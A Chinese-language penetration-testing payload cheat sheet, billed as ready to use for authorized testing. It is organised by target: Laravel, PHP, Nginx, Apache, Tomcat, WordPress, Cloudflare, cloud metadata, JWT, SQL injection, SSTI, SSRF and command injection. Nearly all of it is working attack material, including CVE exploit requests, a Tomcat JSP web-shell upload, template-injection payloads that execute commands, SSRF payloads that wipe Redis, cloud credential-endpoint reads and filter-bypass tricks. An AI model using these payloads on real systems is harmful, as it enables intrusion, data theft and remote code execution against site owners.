# 快速Payload库 — 按框架/CMS/WAF分类

> 即查即用，每条不超过80字。仅用于授权测试。

---

## Laravel

```bash
# .env泄露 → HOST头注入
curl -k -H "Host: ../../../etc/passwd" https://target/

# Debug模式暴露
curl -k https://target/ -H "Accept: application/json" 

# Ignition RCE (CVE-2021-3129)
curl -k -X POST "https://target/_ignition/execute-solution" \
  -H "Content-Type: application/json" \
  -d '{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"cve","viewFile":"/etc/passwd"}}'

# Telescope泄露
curl -k https://target/telescope/requests
curl -k https://target/vendor/telescope

# Horizon面板
curl -k https://target/horizon
```

## PHP通用

```bash
# disable_functions绕过 → LD_PRELOAD
# 上传evil.so → putenv("LD_PRELOAD=/tmp/evil.so");mail("a","b","c","d");

# phpinfo泄露
curl -k https://target/phpinfo.php
curl -k https://target/info.php

# 备份文件
curl -k https://target/.git/HEAD
curl -k https://target/www.zip
curl -k https://target/backup.tar.gz

# Phar反序列化
# phar://uploads/evil.jpg → 自动反序列化metadata
```

## Nginx

```bash
# 路径穿越 alias
curl -k "https://target/static../app/config.py"

# 原始后端(绕过CDN)
curl -k -H "Host: target" https://源IP/

# CRLF注入
curl -k "https://target/%0d%0aSet-Cookie:crlf=injection"

# 合并斜杠绕过
curl -k "https://target//admin/"
```

## Apache

```bash
# CVE-2021-41773 路径穿越
curl -k "https://target/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"

# .htaccess泄露
curl -k https://target/.htaccess
```

## Tomcat

```bash
# CVE-2017-12617 PUT上传
curl -k -X PUT "https://target/shell.jsp/" -d "<%Runtime.getRuntime().exec(request.getParameter(\"c\"));%>"

# Manager爆破
curl -k -u tomcat:tomcat https://target/manager/html
```

## WordPress

```bash
# xmlrpc.php用户枚举
curl -k -X POST https://target/xmlrpc.php \
  -d '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>pass</value></param></params></methodCall>'

# 备份文件
curl -k https://target/wp-config.php.bak
curl -k https://target/wp-content/debug.log
```

## Cloudflare绕过

```bash
# 源IP发现
# 1. DNS历史: securitytrails/censys
# 2. SSL证书: crt.sh → ?q=%.target.com
# 3. 邮件头: 触发找回密码 → 看源IP
# 4. 子域名: subfinder -d target.com → 逐个直接访问

# 源站直接访问
curl -k --resolve target.com:443:源IP "https://target.com/path"
```

## Cloud / AWS

```bash
# 元数据 (AWS)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/user-data/

# GCP
curl http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google"

# Azure
curl http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H "Metadata: true"

# DigitalOcean
curl http://169.254.169.254/metadata/v1.json
```

## JWT攻击

```bash
# alg:none
echo '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=\n';echo -n '.{"user":"admin"}' | base64 | tr -d '=\n';echo -n '.'

# RS256→HS256混淆 (用公钥当HMAC密钥)
python3 jwt_tool.py TOKEN -X k -pk public.pem

# kid注入 → 路径穿越
# "kid":"../../dev/null" → HMAC密钥为空
# "kid":"/etc/passwd" → 读文件内容作为密钥
```

## SQL注入速查

```sql
-- MySQL时间盲注
' OR SLEEP(5)--
' OR IF(1=1,SLEEP(5),0)--

-- MSSQL时间盲注
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- PostgreSQL时间盲注
'; SELECT PG_SLEEP(5)--

-- 万能密码
admin' OR '1'='1'--
' UNION SELECT 1,2,3,4,5--

-- 报错注入
' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--
```

## SSTI速查

```python
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Smarty
{system('id')}
{php}system('id');{/php}
```

## SSRF速查

```bash
# 云元数据
http://169.254.169.254/
http://metadata.google.internal/

# 内网探测
http://10.0.0.1:22/
http://127.0.0.1:6379/  # Redis

# 协议绕过
file:///etc/passwd
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...
dict://127.0.0.1:6379/info
```

## 命令注入速查

```bash
# 链接符
; id
| id
|| id
&& id
`id`
$(id)

# 空格绕过
cat${IFS}/etc/passwd
cat</etc/passwd
{cat,/etc/passwd}

# 关键词绕过
c'a't /etc/passwd
c\at /etc/passwd
/bin/c?t /etc/passwd
```
